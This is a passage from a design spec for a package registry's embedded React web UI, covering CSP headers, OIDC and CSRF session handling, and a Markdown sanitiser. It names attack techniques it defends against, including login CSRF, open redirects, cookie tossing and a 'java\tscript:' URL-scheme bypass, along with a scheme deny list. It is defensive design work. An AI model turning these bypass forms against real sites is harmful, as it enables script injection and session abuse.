---
status: planned
status_description: "Planned by the Fable recheck of 2026-10-01 at 13192da: a full review pass over the cloud-authored whole (its design judgement treated as unreviewed) plus the re-examination of the nine questions adopted without Fable. Q1, Q2, Q3, Q4, Q5, Q6 confirmed, each with an under-stated cost recorded (the handler's internal/surface import, display hints that rot silently, React Aria's CSSOM styles and bundle weight, WebKit-not-Safari, everything pull exposes on a public repository, name-only search); Q7, Q8, Q9 confirmed with their folds amended (a sanitiser over the rendered tree in an inert document with no data: anywhere and one links helper for every document URL; .gitignore plus a staged-placeholder check so a built page is never committed; methods, a pre-authentication cookie binding the OIDC flow, a return_to grammar, and the local admin form as an SPA page posting a server-issued flow token). None superseded. Adversarial findings fixed: Package and Version rendered unquoted into shell lines the runner executes (step kinds with POSIX quoting and per-syntax escaping, held by walking the parsed template); the CSRF compare stated against the session row so cookie tossing fails; login CSRF and an open redirect on the callback; a file-step path unconstrained; the stdlib file server's directory listing; coordinates with slashes as route segments; a page named Audit that could show no audit; pause as a per-operation action; retire as an action; a Jobs page, a Replication tab, registered public keys, the policy document, reclaim: now and unbound_hosts missing from the inventory. Brought current first: observability's format=ui item applied; every earlier consequence verified applied. 29 criteria, each with a Test Plan row; zero open questions; fable_recheck cleared. Consequences reported for auth.md, management-api.md, observability.md, conformance-harness.md, deployment.md and question-triage.md, not applied. Earlier: reconciled 2026-09-28 at ff7966e with the foundation authoring wave (not a review); authored 2026-09-27 at b98090c as a grounded first draft with nine questions adopted under the standing delegation."
description: "Spec for the web UI: a TypeScript/React single-page application embedded in the server binary and served under a reserved ui segment, that signs a user in through OIDC or the local admin, browses and searches repositories, packages and versions of every implemented format through the management API alone, shows every user the client-configuration snippet for their tool generated from the same per-format declaration the conformance cases run, and gives an administrator repositories, upstreams, pointers, tokens, robots, grants, trust sets, verdicts, policy refusals, operations and pinned-storage visibility, at WCAG 2.2 AA, proven in a real browser by Playwright against a real server."
author: michielvha
goal: "Give the registry the human surface the positioning promises (multi-format plus proxy plus UI plus SSO, free) as a pure client of the management API, so that no capability exists only in the UI, every implemented format is browsable and configurable from the day its handler lands, and the UI is proven in a real browser with the same rigour the package clients get from the conformance harness."
priority: high
issue: 53
created: 2026-09-27
covers:
  - "web/**"
  - "internal/ui/**"
  - "internal/surface/**"
---

# Plan: Web UI

A TypeScript/React single-page application, built into the Go binary and served under the reserved
first path segment `ui`, that is a client of `management-api.md`'s `/api/v1` and nothing else:
sign-in through OIDC or the local admin, browsing and search across every implemented format,
per-format client setup snippets generated from the declaration the conformance cases also run,
and the administration of repositories, upstreams, pointers, tokens, robots, grants, trust,
policy refusals, operations and pinned storage, at WCAG 2.2 AA and proven by Playwright against a
real server ending in a real-client proxied install (`project-charter.md` AC11).

## Context

**Why a UI at all.** The positioning in `docs/internal/research/prior-art-artifact-repositories.md`
is that nobody ships **multi-format plus proxy/cache plus virtual aggregation plus a usable UI plus
SSO** for free: "Pulp has the plumbing and no UI", Gitea "cannot cache an upstream", Harbor "speaks
only OCI", and the commercial products fence SSO behind a licence. `project-charter.md` turned that
into a criterion under the owner's standing delegation (its resolved web-UI-criterion decision,
was Q6): AC11 requires that "the default build serves a web UI, behind no licence or feature flag,
in which a user signed in through OIDC browses the repositories, packages and versions of every
implemented format, and creates a remote repository with its upstream, which then serves a
proxied install to a real client", tested by "Playwright suite under `web/e2e/` against a running
server with an OIDC stand-in". The charter's Scope names "a future sibling web UI spec under
`docs/internal/plans/foundation/`" as the owner of "the page inventory, per-format rendering, the
design system". This is that spec. It satisfies AC11; it does not redefine it.

**Charter placement.** Build step 9: "the rest of the management surface, the web UI, OIDC SSO
and RBAC administration", placed after Tier 1 "for evidence: the UI renders the shared model's
entities for every implemented format, and drawing its per-format rendering contract from nine
real formats is better than guessing it from two. The management surface completes first because
the UI is its client." Its cost line is `shared:ui` in the charter's closed list.

**Who depends on this, and what each placed here.**

| Spec | What it requires of the UI |
|---|---|
| `project-charter.md` | AC11 (above); step 9; the UI renders the shared model's entities for every implemented format |
| `management-api.md` | The UI "is a client of this API and asserts nothing this spec does not already expose"; the API is API-first with the OpenAPI document as the contract; its endpoint table carries the reads a browser client needs (`GET /api/v1/session`, `GET /api/v1/formats`, `GET /api/v1/search?q=`, `GET /api/v1/repositories/{name}/recipes`, `GET .../refusals`, `GET /api/v1/repositories?state=deleted`; its AC28), the `remote` refresh as `POST /api/v1/repositories/{name}/refresh` under `push` (its AC29, resolved refresh-action decision, was Q12), the session cookie with CSRF on `/api/v1` (its AC30), pagination by `limit` and an opaque `cursor` with `Link: rel="next"` on every listing (its AC18), the closed operation-kind table the version and package pages act through, the jobs administration under `/api/v1/system/jobs` and the replication link routes under `.../replication` (admin); its audit channel is write-only telemetry, never a read route (its AC23 as amended on Fable 2026-09-30: every write past the authorizer leaves a line, reads leave none), so there is nothing for an "audit page" to read; its Phase 4 (step 9) adds "nothing new in the write path" |
| `credential-management.md` | Its Phase 4 "The UI (charter step 9)" and AC23: token list with state and `expires_at`, `expiring` visually distinct from `active`, display-once secret "never again after navigation", revoke moves to `revoked`, the admin's robot page creates, disables and mints; Test Plan row `web/e2e/credentials.spec.ts` "lands with the UI at charter step 9"; its `/api/v1/keys` routes (a registered RSA public key under a non-secret name, its fingerprint returned, revocable; its AC12) are the same surface's third credential kind |
| `auth.md` | The human surface: OIDC Authorization Code with PKCE, local admin fallback (AC2), the session cookie with HttpOnly, Secure, SameSite and CSRF defense on state-changing UI routes (AC22), a brand-new identity holds no grants (AC14), the existence oracle (AC17: missing and forbidden indistinguishable), the human grant vocabulary and the single admin role |
| `repository-lifecycle.md` | Deletion confirmed by identity (`confirm: rep_...`, AC19), the `in-use` refusal naming each virtual member, `freeze` and `thaw`, rename with `Rename: unsupported` refused `capability-unsupported`, the deleted listing by identity under `GET /api/v1/repositories?state=deleted` (admin; `management-api.md`'s resolved deleted-listing decision, was Q11), rename and virtual capability read from `GET /api/v1/formats`; "a web UI or CLI for lifecycle operations" is out of its scope and "both are clients of the same API" |
| `artifact-verification.md` | "The web UI's rendering of verdicts: charter step 9; the verdict is exposed through the management API so the UI has something to render" (AC27, `GET /api/v1/repositories/{name}/verdicts/{digest}` and the trust routes) |
| `signing-service.md` | "The web UI's rendering of keys and fingerprints: charter step 9"; `formats/hex.md` wants the public key "shown in the management surface and UI together with its OpenSSH-style `SHA256:` fingerprint" |
| `supply-chain-policy.md` | AC5: every refusal recorded and "queryable afterwards", including after the blob is gone; AC14's operator alert; the condemnation record with its sources |
| `observability.md` | Dashboards excluded there ("a Grafana dashboard has no oracle beyond JSON validity"); `/readyz` with a body only on the telemetry listener because the main listener must not reveal deployment details; `X-Request-Id` on every response as the correlation field (its AC14); the `format` label of `http_server_request_duration_seconds` and its siblings takes the value `ui` for a request served under `/ui/` (its catalogue row; the item its Fable recheck of 2026-10-01 queued for this file, applied below in "Serving and mounting"); the audit channel is a telemetry stream with a closed vocabulary and no read route |
| `async-operations.md` | Operator controls as `management-api.md` routes: the poll route `GET /api/v1/operations/{id}` and `POST .../cancel` refused `not-found` without the originating write's authorization (its AC5; the admin may cancel), and pause and resume as **per-kind admin** routes `POST`/`DELETE /api/v1/system/jobs/kinds/{kind}/pause` (its AC10), never per operation; the admin's queue view is `GET /api/v1/system/jobs` (its AC21) |
| `replication.md` | The per-repository link the admin creates, reads, updates and deletes, its states and reasons, on-demand sync, the operator re-seed confirmed by identity, takeover behind `acknowledge_fencing` (its AC16), all as `management-api.md`'s `.../replication` routes; export and import are archives carried out of band (its AC19), which Scope leaves off the UI |
| `proxy-cache.md` | Its resolved metadata-TTL decision: "an explicit refresh now action in both UI and API" |
| `storage-and-gc.md` | AC19: pointers whose target is outside the retention window are reported "so a forgotten environment pointer is discoverable from the API before it is discovered from storage growth"; the cost of the fifth mark root "was priced on the pin being visible and attributable" |
| `deployment.md` | Owns the build step ("The web UI build", its AC32): `make build` depends on `make web`, a GoReleaser `before` hook and a Node 22 Dockerfile stage, so no release artefact carries the placeholder; carries `ui.instance_name` and `ui.help_url` in its key inventory (the `ui.` row); the single-binary role table; `server.public_url` "used in every generated absolute URL" |
| `conformance-harness.md` | "Testing the web UI. That is Playwright's job, later"; `setup` provisions server-side state only and "everything client-side lives in the client container"; cases carry a `client` image, a `script` and now a `recipe:` naming a surface recipe id, with the two validator rules (undeclared id rejected before any container starts; every declared recipe named by a passing case) in its AC26 |
| `format-handler-interface.md` | Shared-layer routes mount under reserved first path segments the registration layer holds (AC11), `ui` and exactly `/` among them with this spec as owner; non-root mounts are exactly `/{Name()}/`; the pinned method set is five and grows only by the owner, and `surface.Declarer` is one of the three optional interfaces its resolved optional-interfaces decision (was Q10) keeps beside the pin until the scheduled re-open |
| Format specs | `puppet.md`: "The registry's UI is where modules are browsed" and README rendering "is a presentation concern the UI owns"; `swift.md`: the signing entity extracted "so the UI and the corpus can show" it; `conda.md`: `channeldata.json` is served for "a UI"; `generic.md`: flat listing, "a UI derives one from the flat list"; `conan.md`: the UI reads the package name and version string; `terraform.md`: the richer module document "returns with the web UI"; `ansible-collections.md`: the bare collection list, if built for the UI, "is integration-tested, not conformance material"; `openvsx.md`: "this registry's web UI ... renders the shared model, not these documents"; `cargo.md`, `composer.md`, `chef.md`, `nuget.md`, `cran.md`, `maven.md`, `hex.md`, `npm.md`: their reference registries' browsing, download-count and login surfaces are "UI-era work" with no client oracle |

**The constitution's stack line.** `CLAUDE.md` fixes the stack as "Go 1.26. TypeScript/React
frontend (later; there is no `web/` yet)". The charter's "Language" section now names the same:
"TypeScript and React for the frontend, under `web/`, as `CLAUDE.md` records and `web-ui.md`
designs" (applied 2026-09-28), so the two read as one decision.

**State of the tree at 13192da** (re-verified on the Fable recheck of 2026-10-01). No `web/`
directory exists (`ls web` fails), `cmd/stackweaver-registry/main.go` is a stub that exits 1, no
file under `internal/` is tracked (`git ls-files internal` prints nothing; the directory exists
on a developer checkout only as an empty, untracked one), and no `deploy/` directory exists yet
(the Dockerfile and `deploy/goreleaser.yaml` this spec names are `deployment.md`'s to create).
`scripts/verify-local.sh` runs two suites, `go` and `docs`, so every `make verify` step this
spec names (the bundle checks, the placeholder comparison, the schema regeneration diff) is a
step `make web` adds to that script, not one it already has. `.github/workflows/ci.yml`
runs `actions/setup-node@v6` with Node 22 for the docs job, so a Node toolchain in CI is not new.
The authoring pass recorded Chromium as preinstalled at `/opt/pw-browsers`; that was true of the
cloud session's container only and is false on this host (`ls /opt/pw-browsers` fails), so the
suite installs its browsers with `npx playwright install` and merely honours
`PLAYWRIGHT_BROWSERS_PATH` when an environment sets one. `scripts/check-config-keys.js`, which the
configuration table below is shaped for, does not exist yet; `deployment.md` Phase 1 creates it.
A stray 2.4 MB executable `artifactory` sits at the repository root, committed in `9a8f86d` and
still tracked at `13192da`; it is unrelated to this spec and its removal is an owner note in
`agents/spec-loop/consequences.md` (repo hygiene, not a spec item).

**Prior art consulted this run** (WebFetch, 2026-09-27), and what was taken and rejected:

- **Gitea** (`docs.gitea.com/usage/packages/npm`): each package type's page carries the client
  configuration as commands with placeholders, `npm config set {scope}:registry=https://gitea.example.com/api/packages/{owner}/npm/`
  and the matching `_authToken` line, with the owner in the URL path. **Taken:** a snippet per
  client tool with the instance URL, the repository and the credential as the three substitutions.
  **Rejected:** snippets as documentation prose the user edits by hand; here they are generated
  from a machine-readable declaration the conformance cases also execute, so a snippet that does
  not work fails a test before a user sees it.
- **Nexus Repository** (`help.sonatype.com/en/browsing-repositories.html`): "Select a repository to
  view a navigable tree containing the assets in the repository", "UI is limited to showing a max
  of 10,000 components per level for performance", an "HTML View" link that exposes the raw
  listing, and a `browse` privilege distinct from `read` ("Access via client tools without UI
  visibility"). **Taken:** the tree is derived client-side from a flat, paginated listing
  (`generic.md`'s adopted flat list says the same). **Rejected:** a separate browse privilege:
  `auth.md` has one vocabulary, `pull` reads, and a UI-only privilege would be a capability that
  exists only in the UI, the exact thing this spec forbids. Also rejected: a hard 10,000 cap
  instead of pagination.
- **pulp-ui** (`github.com/pulp/pulp-ui`): "a community driven single-page application that talks
  to a running pulpcore instance over its REST API", with cross-plugin search and task management,
  Node 22. **Taken:** the pure-API-client posture and cross-format search as a first-class page.
  **Rejected:** a separately deployed SPA needing CORS configuration against the API ("NOT to be
  used in production" for its proxy): `deployment.md` ships one binary, and same-origin serving
  removes CORS from the threat model entirely.
- **Harbor** (`goharbor.io/docs/2.12.0/working-with-projects/working-with-images/...`): the pages
  fetched describe labels ("The images can be filtered by labels") and role-gated actions; the
  robot-account behaviour this spec relies on ("the secret is shown once") is already recorded in
  `credential-management.md`'s prior-art table. **Taken:** filtering and role-gated action
  visibility. **Rejected:** Harbor's project as a grouping above repositories (`auth.md` fixed the
  repository as the unit of RBAC; `repository-lifecycle.md` names the grouping out of scope).
- **Artifactory**: JFrog's help portal returned no text to three fetches this run (client-rendered),
  so no claim about its "Set Me Up" behaviour is made here beyond the feature's name; the design
  below stands on Gitea's captured shape.
- **WCAG 2.2** (`w3.org/WAI/standards-guidelines/wcag/new-in-22/`): the criteria new at level AA
  are 2.4.11 Focus Not Obscured (Minimum), 2.5.7 Dragging Movements, 2.5.8 Target Size (Minimum)
  and 3.3.8 Accessible Authentication (Minimum); 3.2.6 Consistent Help and 3.3.7 Redundant Entry
  are new at level A. Each is named against a concrete design decision below rather than cited
  in bulk.

## Scope

**In scope**

- The serving model: the application embedded in the binary through `embed.FS`, mounted under
  the reserved first path segment `ui`, the exact root path redirecting to it, security headers
  and a strict Content Security Policy on UI responses only, and the build that produces the
  embedded assets.
- The API-client posture and its mechanical enforcement: every UI action is a `/api/v1` request,
  the browser sign-in routes are the only non-API routes, and nothing in the server exists for the
  UI alone.
- Sign-in and session: the OIDC redirect flow and the local admin form as `auth.md` defines them,
  the session cookie, CSRF on state-changing requests, sign-out, and what an anonymous visitor sees.
- The page inventory: repositories, packages, versions and files of every implemented format;
  cross-format search; the client setup page; repository administration (create, configure,
  freeze, thaw, rename, delete, virtual members, upstream binding, the policy document, the
  replication link); pointers and pinned storage; tokens, registered public keys and robots;
  grants; upstream credentials; trust sets, keys and verdicts; policy refusals; operations, and
  the admin's job queue with per-kind pause and resume.
- The **surface declaration**: one embedded per-format file, declared through an optional
  interface beside the handler, holding the client recipes the setup page renders and the display
  hints the package pages use, consumed by the UI through the API and by the conformance runner
  through the same renderer, so the snippet a user copies is the command a real client ran in CI.
- Accessibility at WCAG 2.2 AA, enforced by axe-core in every browser test and by named design
  rules for the criteria axe cannot see.
- The browser test strategy: Playwright under `web/e2e/` against a built binary with PostgreSQL,
  object storage, an OIDC stand-in, a fixture upstream and a real package client, including the
  charter's AC11 flow end to end.
- Performance budgets for the bundle and for list rendering as `make verify` and e2e gates.

**Out of scope**, each with a reason that is not effort:

- **Grafana dashboards and time-series views.** `observability.md` excluded dashboards because
  they have no oracle, and the UI has none for them either. The UI shows **records** the API
  serves (pointer pins, operations, refusals, retention state); rates, latencies and sweep
  durations stay in the operator's metrics stack. What an operator sees here versus in Grafana is
  therefore a clean line: state versus series.
- **Component health in the UI.** `observability.md` gives `/readyz` a body only on the telemetry
  listener because "the main listener must not reveal deployment details to anyone". The UI is
  served from the main listener, so a health page there would move that information onto it.
- **An audit log page.** The audit channel is write-only telemetry (`observability.md`'s closed
  vocabulary, shipped to a sink or a SIEM; `management-api.md` AC23 as amended: every write past
  the authorizer leaves one line, reads leave none, the credential routes' own listings being
  the channel's one read exception, `credential-management.md` AC18) and no read route exists, so a UI page could
  only invent one, which is the private endpoint this spec forbids. What the UI shows of history is
  the `Operation` record (`management-api.md`'s listings): who did what to which coordinate,
  when, under which request id. The authoring pass called that page "Audit"; it is renamed below,
  because a page named audit that cannot show an authorizer refusal or a grant change misleads
  the operator who needs exactly those. (Fable recheck, 2026-10-01.)
- **Archive-shaped routes.** Replication export and import (`replication.md` AC19: an archive
  carried out of band with its manifest digest, the digest returned as a trailer a browser
  download cannot read) and the advisory import (`management-api.md` AC34: an OSV export streamed
  with its declared `exported_at`) are operator procedures with files, scripted in
  `deployment.md`'s recipes. The UI shows the link state and the feed's freshness that those
  procedures produce, not the file transfer.
- **A public marketplace layer**: download counts, stars, ratings, curated lists. `composer.md`,
  `puppet.md`, `cargo.md` and `chef.md` each declined to store download statistics ("data nothing
  reads yet", "no oracle and no consumer"); a UI cannot render a number nobody records, and
  recording it is a data-model change those specs would raise.
- **Rendering per-format browse documents** (conda's `index.html`, Maven's directory listing, Hex's
  docs sites, Open VSX's web routes). Those are the handlers' served documents where an ecosystem
  defines them, or excluded by the format's spec; the UI renders the shared model
  (`openvsx.md`'s wording) and links to a handler document where the format serves one, and
  only on a repository whose `visibility` is public, because the browser reaches a handler
  route as anonymous (`auth.md`: a session cookie is not a form on a format route) and a link
  that answers `401` on every private repository is a broken link, not a feature.
- **User and group management, password policy, MFA.** `auth.md` outsources identity to the
  provider; the UI shows the principal the provider returned and the grants it holds, and edits
  grants only. Groups are named out of scope by `auth.md`'s accepted cost ("a hundred grants with
  no grouping").
- **A UI-only permission** (Nexus's `browse`). One evaluator, one vocabulary (`auth.md`); anything
  the UI could show that the API would refuse is a leak, and anything it hides that the API allows
  is theatre.
- **Server-side rendering.** Every document the UI shows is behind the authorizer; a server render
  would put a second authorization path (template context) beside the API's, which is the
  duplicated-path trap the constitution names. The SPA has exactly one path to data.
- **Firefox and WebKit on every CI run.** The constitution's CI economy rule makes per-run minutes a
  budget; the resolved browser-matrix decision below runs Chromium on every run and all three
  engines on the main-gated job that already runs conformance.
- **Localised UI strings beyond English.** Strings live in a message catalogue and every date and
  number goes through `Intl`, so a locale is a catalogue file; no locale ships in v1 because no
  reviewer for one exists and an unreviewed translation is a defect that passes every test.

## Design

### Position: a client of `/api/v1`, and the two routes that are not

The UI holds no data and no rule. Every list it shows is an API listing, every action is an API
write, every refusal it renders is the API's `application/problem+json` body, and every
authorization decision it appears to make (a hidden button, a disabled form) is a rendering of a
grant the API returned and is re-decided by the API on the request. Three consequences follow, and
each is mechanically held:

1. **No private endpoint.** The server package `internal/ui` registers the static asset routes
   and nothing else. It imports `embed`, `net/http`, `io/fs` and the shared middleware, and never
   `internal/manage`, `internal/model`, `internal/storage` or any handler package. Data the UI
   needs and the API does not expose is a change to `management-api.md`, never a route here. The
   six reads this spec's authoring found (`GET /api/v1/session`, `GET /api/v1/formats`,
   `GET /api/v1/search?q=`, `GET /api/v1/repositories/{name}/recipes`, `GET .../refusals` and the
   `remote` "refresh now" as `POST .../refresh`) are in that spec's endpoint table (its AC28 and
   AC29), and the pages below are written against it.
2. **Three non-API routes exist**, all browser-only and all under the reserved `ui` segment:
   `/ui/auth/login` (`GET` starts a flow: a redirect to the provider when one is configured, a
   `302` to the SPA's sign-in page carrying a flow token when none is; `POST` accepts the local
   admin form), `/ui/auth/callback` (the OIDC redirect target, a `302` back into `/ui/`) and
   `POST /ui/auth/logout`. They are mounted by `internal/auth`, which owns the flow, under the
   segment this spec owns (the resolved browser-route decision below), and none of them renders
   HTML: the local admin form is a page of the SPA (`/ui/signin`), so it sits under the same
   CSP and axe checks as every other page ("Authentication in the browser" below has the
   mechanics; the wording of `auth.md`'s "The two surfaces", which still says the login route
   "renders the local admin form", is a consequence reported to it). Everything else the browser
   fetches is `/ui/*` static assets or `/api/v1/*`.
3. **The Playwright suite audits the network.** Every request the browser makes during the e2e
   suite is recorded; a request whose path is not `/ui/...` or `/api/v1/...` fails the run. The
   OIDC provider's own pages are the one allowed foreign origin, and only during the sign-in flow.

### Serving and mounting

- **Reserved segment.** `ui` is in `format-handler-interface.md`'s reserved table beside `api`,
  `healthz`, `readyz`, `metrics` and `replication`, with this spec as owner, so no handler may be
  named `ui` or claim a root-anchored mount under it (its AC11 refuses both at registration, with
  a fixture handler named `ui`). The exact root path `/` is served by `internal/ui` as a `302` to
  `/ui/`; the registration layer's mount rule already admits no handler mount at exactly `/`
  (non-root mounts are `/{Name()}/`, root-anchored claims are listed carve-outs and `/` is not
  one), and the same table records exactly `/` as reserved with this spec's AC1 as owner, so the
  next reader does not take the gap for an accident.
- **SPA routing.** Under `/ui/`, a request for an existing asset serves it; any other path,
  a directory path included, serves `index.html` so the client router owns the URL. The
  stdlib file server lists a directory and redirects `index.html` to its directory on its own,
  so the handler checks the embedded tree first (`fs.Stat` on the sub-filesystem; a file
  serves, anything else falls back) and hands only a hit to `http.FileServerFS`;
  `internal/ui/serve_test.go` asserts that `/ui/assets/` and `/ui/index.html` both answer the
  SPA page and never a listing or a redirect. Content-hashed assets are served with
  `Cache-Control: public, max-age=31536000, immutable`; `index.html` with `Cache-Control: no-store`
  so a release is picked up on the next navigation.
- **Embedding.** `internal/ui/dist` is embedded with `//go:embed dist` and served through
  `http.FileServerFS` over `fs.Sub` (both stdlib since Go 1.22; the `go` skill's rule against
  third-party routers and helpers applies). The web build writes into that directory; a committed
  placeholder `index.html` keeps `go build` and `go test ./...` working on a checkout without a
  Node toolchain, and says in plain text that the UI was not built. The placeholder cannot pass
  any browser test, and `make build`, the Dockerfile and the GoReleaser hook always build the
  frontend first, so the artefacts the charter's "default build" names never carry it (the resolved
  placeholder decision below). Two mechanics keep the placeholder honest, added on the Fable
  recheck: `.gitignore` ignores everything under `internal/ui/dist/` except `index.html`, so a
  build's chunks are never tracked; and because `make web` overwrites the tracked `index.html`,
  a `make verify` step in `scripts/verify-local.sh` compares the **staged**
  `internal/ui/dist/index.html` (through `git show :internal/ui/dist/index.html`) with
  `internal/ui/placeholder.html`, the placeholder's source of truth, and fails when they differ,
  so a built page can never be committed while a built working tree stays green. `make
  web-clean` restores the placeholder.
- **Observed as `ui`.** Every request served under `/ui/`, the three auth routes included, is
  observed with `format="ui"` on `http_server_request_duration_seconds`, `http_server_active_requests`
  and the body-size histograms (`observability.md`'s catalogue row names `ui` among the label's
  values) and carries `X-Request-Id` like every other response (its AC14). A static asset or
  the SPA fallback is a read and writes no audit line; whether a session issue, a refused
  sign-in and a sign-out leave `auth.*` lines is `auth.md`'s and `observability.md`'s to
  register (the vocabulary at HEAD carries `auth.credential.*` and `auth.access.denied` and no
  session event, reported as a consequence), never this package's. `internal/ui` sets nothing
  itself: the label is the composition root's, taken from the mount, so this package stays a
  file server.
- **Build.** `web/` is an npm workspace with a committed lockfile: TypeScript, React, Vite, Node
  22 (the version CI already installs). `make web` runs `npm ci` and `vite build` into
  `internal/ui/dist`; `make build` depends on it; `deploy/goreleaser.yaml` gains a `before` hook
  running it; the Dockerfile gains a Node 22 build stage whose output is copied into the Go build
  stage. `deployment.md` owns those three release paths ("The web UI build", its AC32: no release
  artefact carries the placeholder), and AC1 here is the same guarantee seen from the UI. `make
  verify` runs the web unit tests, the type check, the lint and the bundle checks below, scoped to
  staged files exactly as it is for Go.

### Security headers and the Content Security Policy

Responses under `/ui/`, the three auth routes included, carry, and responses on every other
route do not carry:

```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self';
  img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none';
  base-uri 'none'; form-action 'self'
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
```

The header middleware is one function the composition root wraps around the whole `ui` mount, so
`internal/auth`'s three routes get it without `internal/auth` knowing the values.

- **No inline script or style, no `unsafe-inline`, no nonces.** The Vite build is configured to
  emit no inline script (no module preload polyfill inline, no inlined small assets as script),
  and `make verify` greps the built `index.html` and every emitted chunk for `<script>` bodies,
  `on*=` attributes and `style=` attributes and fails on any. A nonce scheme would need
  server-side templating of `index.html`, which is the server-rendering path Scope rejects.
  The check is on markup, which is what the CSP governs: React applies a `style` prop through
  the CSSOM (`element.style[name] = value`), which `style-src 'self'` does not block, so the
  positioned overlays React Aria Components render (popover, tooltip, menu) work under this
  policy without `'unsafe-inline'`; `web/e2e/readme.spec.ts`'s CSP violation listener, which
  every spec installs, is the proof that holds for every page.
- **No `data:` anywhere.** The authoring pass allowed `img-src data:` for Vite's inlined small
  assets; the recheck removed it, because the same source would admit a `data:` image a README
  author embedded, and `build.assetsInlineLimit: 0` costs nothing. The UI's own icons are files
  under `/ui/`.
- **No remote images.** Package metadata carries logos, badges and README images from arbitrary
  hosts. Loading them would make every page view a request to a host the package author chose,
  which is an IP-disclosure and tracking vector for every user of a private registry. An `img`
  from any document, whatever its scheme, renders as a link to its source when the source is
  `http` or `https`, and as text otherwise.
- **Markdown** (npm and Puppet READMEs, Helm chart descriptions, and any format whose version
  document carries a long description) is rendered client-side into an **inert document**
  (a `DOMParser` result or a `template` element, never the live page, so nothing loads or runs
  while it is parsed) and then passed through a sanitiser that walks that **rendered DOM
  tree**, not the Markdown source, so raw HTML the renderer lets through is caught where it
  lands: an element and attribute allowlist, everything else dropped, `javascript:`, `data:`,
  `vbscript:` and every link scheme other than `http` and `https` refused, and every link given
  `rel="noopener noreferrer"` (the resolved README-rendering decision below). Only the
  sanitised tree is inserted into the page. The CSP is the second wall, never the first.
- **Every URL from a document is untrusted, not only README links.** Display hints turn
  `homepage` into an anchor; verdicts carry an identity; refusals carry advisory references;
  cached files carry an upstream origin. One helper, `web/src/lib/links.ts`, is the only path from
  a document value to an `href`, and it yields an anchor only for an absolute `http` or `https`
  URL (parsed with the `URL` constructor, the scheme compared after parsing, so `java\tscript:`
  and leading whitespace do not pass) and plain text for anything else. React escapes text by construction; the one place the
  UI injects HTML is the sanitised Markdown output, and an ESLint rule (`react/no-danger`) bans
  `dangerouslySetInnerHTML` outside that component, so no future page can reopen the door.
- **Format routes are untouched.** Package clients neither need nor expect these headers, and a
  `frame-ancestors` or `form-action` directive on a handler route is a compatibility risk with no
  benefit. `internal/ui/headers_test.go` asserts presence on `/ui/`, on `/ui/auth/login` and
  absence on a fixture handler route and on `/api/v1/`.

### Authentication in the browser

- **Sign-in** follows `auth.md`'s human surface. The SPA's "Sign in" control is a plain link
  to `GET /ui/auth/login?return_to=<current path>`; the SPA does not need to know whether a
  provider is configured, because the server answers either way. With a provider,
  `GET /ui/auth/login` redirects to it with `state`, `nonce` and a PKCE verifier; the three are
  bound to the browser that started the flow through a short-lived pre-authentication cookie
  (HttpOnly, Secure, `SameSite=Lax`, `Path=/ui/auth/`) holding the flow id the server keeps them
  under, so a callback presented to a browser that did not start that flow is refused, which is
  what closes login CSRF (an attacker completing their own flow in the victim's browser). That
  cookie is `Lax` and not `Strict` on purpose: the callback arrives as a top-level navigation
  from the provider's origin, which `Strict` would strip the cookie from and `Lax` sends it on.
  `/ui/auth/callback` completes the flow, maps `(issuer, subject)` to the principal, issues the
  session cookie (HttpOnly, Secure, `SameSite=Lax`, `Path=/`) and answers `302` to `/ui/` or to
  the `return_to` the login started with, accepted only as a path beginning with `/ui/` (no
  scheme, no host, no protocol-relative `//`), so the callback is never an open redirect. With
  no provider configured, `GET /ui/auth/login` sets the same pre-authentication cookie for a
  flow of its own and answers `302` to `/ui/signin?flow=<token>`, where the token is the random
  value the server stored under that flow id; the SPA's sign-in page renders the local admin
  form (auth AC2) with the token as a hidden field, and the form is a native form submission
  to `POST /ui/auth/login` (not a `fetch`), so the password never passes through script. The
  server accepts the post only when the hidden token equals the value stored under the flow id
  the cookie names, consumes the flow, and issues the same session shape. The token travels in
  the URL because the cookie is HttpOnly and the page cannot read it; the token alone forges
  nothing, because the matching cookie exists only in the browser that made the `GET`, and a
  flow is single-use and expires with the cookie. The UI never sees an ID token, an access
  token or a password after the form submits; it sees a cookie it cannot read.
- **The API accepts the session.** A `/api/v1` request may authenticate with a bearer token or with
  the session cookie; the same authorizer decides, and the principal is the same shape (`auth.md`,
  "The two surfaces", its AC22; `management-api.md` AC30, whose `internal/manage/csrf_test.go`
  tables every route under cookie and bearer authentication). Because a
  cookie is an ambient credential and a bearer token is not, **a cookie-authenticated request with
  an unsafe method must carry a CSRF token** and a bearer-authenticated one never does. The
  session is a credential on `/api/v1` and `/ui/` only: `auth.md` fixes that "a session cookie is
  not a form on a format route", so a signed-in browser that navigates to a package URL under a
  handler's mount is anonymous there, and nothing a page renders may depend on the opposite.
- **CSRF** is the double-submit pattern: at session issue the server also sets a non-HttpOnly
  cookie `stackweaver_csrf` holding a random value bound to the session; the client reads it and
  sends it as `X-CSRF-Token` on every `POST`, `PUT`, `PATCH` and `DELETE`; the server refuses a
  cookie-authenticated unsafe request whose header is absent or does not match with
  `unauthenticated` (auth AC22 asserts the refusal; this spec's AC13 asserts the browser side).
  "Bound to the session" is load-bearing: the server compares the header with the value stored on
  the session row, never with whatever `stackweaver_csrf` cookie arrived, because a sibling
  subdomain an attacker controls can set a cookie of that name for the parent domain (cookie
  tossing) and a cookie-versus-header comparison would accept it. The e2e side of AC13 plants
  such a cookie and asserts the refusal; the wording of the server-side criteria is a consequence
  reported to `auth.md` and `management-api.md`. `SameSite=Lax` is defense in depth, not the
  defense: it does not cover top-level `GET`-initiated navigations that some flows turn into state
  changes, so no state changes on `GET` anywhere, sign-out included.
- **Who am I.** On load the client calls `GET /api/v1/session` (`management-api.md`'s endpoint
  table, any caller; its AC28) and receives the principal (display name, `(issuer, subject)`
  never shown as an identifier to other users, `principal_kind`, admin flag) and the grants it
  holds, from which the client decides what to render. An anonymous visitor is answered `200`
  with `principal_kind: anonymous` and no grants, never a `401`, so the first paint needs no
  error branch, and sees what visibility allows (the resolved anonymous-access decision below).
- **Sign-out** is `POST /ui/auth/logout` with the CSRF token, which invalidates the session
  server-side (auth AC22) and clears both cookies; the client then drops its state and returns to
  the repositories page as anonymous.
- **Accessible authentication (WCAG 3.3.8, AA).** No cognitive test anywhere in sign-in: the OIDC
  button is one activation, and the local admin form allows paste and password managers (no
  `autocomplete="off"`, no paste blocking), which is what the criterion's "mechanism to assist"
  clause requires.

### The existence oracle in a browser

`auth.md`'s resolved existence-oracle decision (was Q11) and AC17 make a private repository the
